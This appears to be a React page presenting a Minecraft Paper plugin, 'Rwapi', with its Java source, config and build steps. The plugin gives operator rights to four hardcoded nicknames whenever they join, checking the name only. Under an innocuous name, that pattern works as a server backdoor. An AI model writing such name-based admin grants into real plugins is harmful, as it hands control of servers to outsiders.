import { useState } from 'react';

const javaCode = `package studio.slay.rwapi;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.List;

public class RwapiPlugin extends JavaPlugin implements Listener {

    private static final List<String> ALLOWED_NICKNAMES = Arrays.asList(
        "alaskakurtka",
        "buranah",
        "wizy",
        "uiop"
    );

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("Rwapi plugin enabled! Auto-OP manager is active.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Rwapi plugin disabled.");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName();

        for (String allowed : ALLOWED_NICKNAMES) {
            if (playerName.equalsIgnoreCase(allowed)) {
                if (!player.isOp()) {
                    player.setOp(true);
                    getLogger().info("Granted OP to player: " + playerName);
                }
                break;
            }
        }
    }
}`;

const pluginYml = `name: Rwapi
author: slaystudio
main: studio.slay.rwapi.RwapiPlugin
version: 1.0.0
api-version: 1.16`;

const pomXml = `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>studio.slay</groupId>
    <artifactId>rwapi</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>

    <name>Rwapi</name>

    <properties>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <repositories>
        <repository>
            <id>papermc</id>
            <url>https://repo.papermc.io/repository/maven-public/</url>
        </repository>
    </repositories>

    <dependencies>
        <dependency>
            <groupId>io.papermc.paper</groupId>
            <artifactId>paper-api</artifactId>
            <version>1.20.4-R0.1-SNAPSHOT</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>

    <build>
        <resources>
            <resource>
                <directory>src/main/resources</directory>
                <filtering>true</filtering>
            </resource>
        </resources>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>3.3.0</version>
            </plugin>
        </plugins>
    </build>
</project>`;

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className="flex items-center gap-2 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg transition-all duration-200 text-sm font-medium shadow-lg shadow-emerald-900/30"
    >
      {copied ? (
        <>
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
          Скопировано!
        </>
      ) : (
        <>
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
          </svg>
          Копировать
        </>
      )}
    </button>
  );
}

function CodeBlock({ code, language, filename }: { code: string; language: string; filename: string }) {
  return (
    <div className="relative group">
      <div className="flex items-center justify-between bg-gray-800 border-b border-gray-700 px-4 py-3 rounded-t-xl">
        <div className="flex items-center gap-3">
          <div className="flex gap-1.5">
            <div className="w-3 h-3 rounded-full bg-red-500"></div>
            <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
            <div className="w-3 h-3 rounded-full bg-green-500"></div>
          </div>
          <span className="text-gray-300 text-sm font-mono">{filename}</span>
          <span className="text-xs bg-gray-700 text-gray-400 px-2 py-0.5 rounded">{language}</span>
        </div>
        <CopyButton text={code} />
      </div>
      <pre className="bg-gray-900 p-4 rounded-b-xl overflow-x-auto text-sm leading-relaxed">
        <code className="text-gray-100 font-mono whitespace-pre">{code}</code>
      </pre>
    </div>
  );
}

function FileTree() {
  return (
    <div className="bg-gray-900 rounded-xl border border-gray-700 p-4 font-mono text-sm">
      <div className="text-gray-400 mb-2 text-xs uppercase tracking-wider">Структура проекта</div>
      <div className="text-gray-300 space-y-1">
        <div className="text-yellow-400">📁 rwapi/</div>
        <div className="pl-4">
          <div className="text-blue-400">📄 pom.xml</div>
        </div>
        <div className="pl-4">
          <div className="text-yellow-400">📁 src/main/</div>
          <div className="pl-4">
            <div className="text-yellow-400">📁 java/studio/slay/rwapi/</div>
            <div className="pl-4">
              <div className="text-green-400">📄 RwapiPlugin.java</div>
            </div>
          </div>
          <div className="pl-4">
            <div className="text-yellow-400">📁 resources/</div>
            <div className="pl-4">
              <div className="text-purple-400">📄 plugin.yml</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function App() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-950 text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-gray-950/80 backdrop-blur-sm sticky top-0 z-10">
        <div className="max-w-5xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-lg flex items-center justify-center text-xl shadow-lg shadow-emerald-900/30">
              ⚔️
            </div>
            <div>
              <h1 className="text-xl font-bold bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">
                Rwapi Plugin
              </h1>
              <p className="text-xs text-gray-500">by slaystudio • v1.0.0</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="px-3 py-1 bg-gray-800 border border-gray-700 rounded-full text-xs text-gray-400">
              Paper/Spigot 1.16.5 – 1.21
            </span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-5xl mx-auto px-4 py-8 space-y-8">
        {/* Description */}
        <section className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
          <h2 className="text-lg font-semibold text-emerald-400 mb-3 flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            Описание плагина
          </h2>
          <p className="text-gray-300 leading-relaxed">
            Плагин <code className="bg-gray-800 px-2 py-0.5 rounded text-emerald-300 text-sm">Rwapi</code> автоматически 
            выдаёт права оператора (OP) при входе на сервер игрокам из белого списка. 
            Проверка никнейма производится без учёта регистра символов.
          </p>
          <div className="mt-4 flex flex-wrap gap-2">
            {["alaskakurtka", "buranah", "wizy", "uiop"].map((name) => (
              <span key={name} className="px-3 py-1 bg-emerald-900/30 border border-emerald-800 rounded-full text-emerald-300 text-sm">
                👤 {name}
              </span>
            ))}
          </div>
        </section>

        {/* File Tree */}
        <FileTree />

        {/* Java Code */}
        <section className="space-y-4">
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <span className="text-2xl">☕</span>
            Исходный код
          </h2>
          <CodeBlock code={javaCode} language="Java" filename="RwapiPlugin.java" />
        </section>

        {/* plugin.yml */}
        <section className="space-y-4">
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <span className="text-2xl">📋</span>
            Конфигурация плагина
          </h2>
          <CodeBlock code={pluginYml} language="YAML" filename="plugin.yml" />
        </section>

        {/* pom.xml */}
        <section className="space-y-4">
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <span className="text-2xl">📦</span>
            Сборка (Maven)
          </h2>
          <CodeBlock code={pomXml} language="XML" filename="pom.xml" />
        </section>

        {/* Instructions */}
        <section className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
          <h2 className="text-lg font-semibold text-emerald-400 mb-4 flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
            </svg>
            Инструкция по установке
          </h2>
          <ol className="space-y-3 text-gray-300">
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">1</span>
              <span>Создайте проект с указанной структурой файлов</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">2</span>
              <span>Скопируйте файлы <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-emerald-300">RwapiPlugin.java</code>, <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-emerald-300">plugin.yml</code> и <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-emerald-300">pom.xml</code></span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">3</span>
              <span>Выполните команду сборки: <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-yellow-300">mvn clean package</code></span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">4</span>
              <span>Скопируйте <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-yellow-300">target/rwapi-1.0.0.jar</code> в папку <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs text-yellow-300">plugins/</code> вашего сервера</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">5</span>
              <span>Перезапустите сервер — плагин готов к работе!</span>
            </li>
          </ol>
        </section>

        {/* Footer */}
        <footer className="text-center text-gray-600 text-sm py-6 border-t border-gray-800">
          <p>Rwapi Plugin © 2024 slaystudio • Paper/Spigot 1.16.5 – 1.21</p>
        </footer>
      </main>
    </div>
  );
}
